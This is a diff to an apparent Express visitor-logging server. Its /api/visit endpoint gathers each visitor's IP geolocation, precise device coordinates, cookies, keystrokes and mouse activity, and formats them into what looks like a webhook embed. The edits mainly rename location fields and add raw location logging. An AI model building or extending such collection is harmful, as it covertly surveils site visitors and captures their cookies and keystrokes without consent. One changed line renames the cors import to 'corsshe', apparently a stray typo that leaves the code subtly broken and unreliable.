@@ -1,5 +1,5 @@
 const express = require('express');
-const cors = require('cors');
+const corsshe = require('cors');
 const useragent = require('useragent');
 const rateLimit = require('express-rate-limit');
 const { v4: uuidv4 } = require('uuid');
@@ -264,7 +264,7 @@ function detectSecurityThreats(req, visitorInfo) {
     });
   }
 
-  if (req.body.location && req.body.location !== 'Geolocation not available' && req.body.location !== 'Geolocation not supported') {
+  if (req.body.location && !req.body.location.error) {
     const { latitude, longitude, accuracy } = req.body.location;
     if (latitude === 0 && longitude === 0) {
       threats.push({
@@ -290,6 +290,8 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       cookies: req.cookies,
       body: req.body
     });
+    logger.info('Raw location data received:', { location: req.body.location });
+
     const ipInfo = getClientIP(req);
     const ip = ipInfo.primary;
     
@@ -315,8 +317,8 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       region: geoData.regionName,
       city: geoData.city,
       zip: geoData.zip,
-      latitude: geoData.lat,
-      longitude: geoData.lon,
+      ipLatitude: geoData.lat,
+      ipLongitude: geoData.lon,
       isp: geoData.isp,
       organization: geoData.org,
       as: geoData.as,
@@ -353,7 +355,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       currentUrl: req.body.currentUrl || 'Unknown',
       scrollPosition: req.body.scrollPosition || 'Unknown',
       cookies: JSON.stringify(req.cookies) || '{}',
-      location: req.body.location || 'Unknown',
+      deviceLocation: req.body.location || { error: 'No location data provided' },
       part3: {
         keystrokes: req.body.part3?.keystrokes || 'None',
         mouseMovementFrequency: req.body.part3?.mouseMovementFrequency || 'Unknown',
@@ -401,8 +403,8 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'Region', value: visitorInfo.region, inline: true },
       { name: 'City', value: visitorInfo.city, inline: true },
       { name: 'ZIP', value: visitorInfo.zip || 'N/A', inline: true },
-      { name: 'IP-based Coordinates', value: `(${visitorInfo.latitude}, ${visitorInfo.longitude})`, inline: true },
-      { name: 'Device Location', value: visitorInfo.location !== 'Unknown' ? `(${visitorInfo.location.latitude}, ${visitorInfo.location.longitude}, Accuracy: ${visitorInfo.location.accuracy}m)` : visitorInfo.location, inline: true },
+      { name: 'IP-based Coordinates', value: `(${visitorInfo.ipLatitude}, ${visitorInfo.ipLongitude})`, inline: true },
+      { name: 'Device Location', value: visitorInfo.deviceLocation.error ? visitorInfo.deviceLocation.error : `(${visitorInfo.deviceLocation.latitude}, ${visitorInfo.deviceLocation.longitude}, Accuracy: ${visitorInfo.deviceLocation.accuracy}m)`, inline: true },
       { name: 'ISP', value: visitorInfo.isp, inline: true },
       { name: 'Organization', value: visitorInfo.organization || 'N/A', inline: true },
       { name: 'AS', value: visitorInfo.as || 'N/A', inline: true },
